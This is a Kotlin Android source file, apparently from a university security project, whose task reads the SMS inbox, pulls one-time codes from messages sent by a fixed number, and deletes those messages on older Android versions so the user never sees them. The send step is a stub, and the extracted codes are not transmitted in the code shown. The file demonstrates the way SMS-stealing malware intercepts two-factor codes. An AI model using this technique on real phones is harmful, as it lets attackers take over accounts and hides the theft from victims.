package pl.edu.agh.sarna.smsToken.task

import android.app.ProgressDialog
import android.content.Context
import android.net.Uri
import android.os.AsyncTask
import android.telephony.SmsManager
import android.widget.Toast
import pl.edu.agh.sarna.smsToken.Extractor
import pl.edu.agh.sarna.smsToken.model.SmsMessage
import pl.edu.agh.sarna.utils.kotlin.async.AsyncResponse
import pl.edu.agh.sarna.utils.kotlin.isKitKat4_4

class ClassicTokenTask(private val context: Context, private val response: AsyncResponse,
                       private val defaultSmsApp: Boolean,
                       private val readSmsPermissionGranted: Boolean) : AsyncTask<Void, Void, Int>() {
    private val progDialog = ProgressDialog(context)

    private val sender = "+48731464100"

    private val idColumn = 0
    private val numberColumn = 2
    private val textColumn = 12

    override fun onPreExecute() {
        progDialog.setMessage("Loading...")
        progDialog.isIndeterminate = false
        progDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER)
        progDialog.setCancelable(true)
        progDialog.show()
    }

    override fun doInBackground(vararg p0: Void?): Int {
        sendSms()
        if (!defaultSmsApp and readSmsPermissionGranted) {
            val list = readSms()
            val codes = Extractor().extract(list)
            if (!isKitKat4_4())
                list.forEach {
                    deleteSms(it)
                }
        }
        Thread.sleep(1000)
        return 0
    }
    override fun onPostExecute(result: Int?) {
        progDialog.dismiss()
        response.processFinish(result!!)

    }
    private fun deleteSms(sms: SmsMessage) {
        context.contentResolver.delete(Uri.parse("content://sms/" + sms.id), null, null);
    }

    private fun sendSms() {
        val smsManager = SmsManager.getDefault()
//            smsManager.sendTextMessage(phoneNumber, null, "blabla haslo: 9372903 b", null, null)

    }

    private fun readSms() : ArrayList<SmsMessage> {
        val list = ArrayList<SmsMessage>()
        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)

        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                if(cursor.getString(numberColumn) == sender){
                    list.add(SmsMessage(cursor.getInt(idColumn), cursor.getString(numberColumn), cursor.getString(textColumn)))
                }
            } while (cursor.moveToNext())
        } else {
        }
        cursor.close()
        return list
    }
}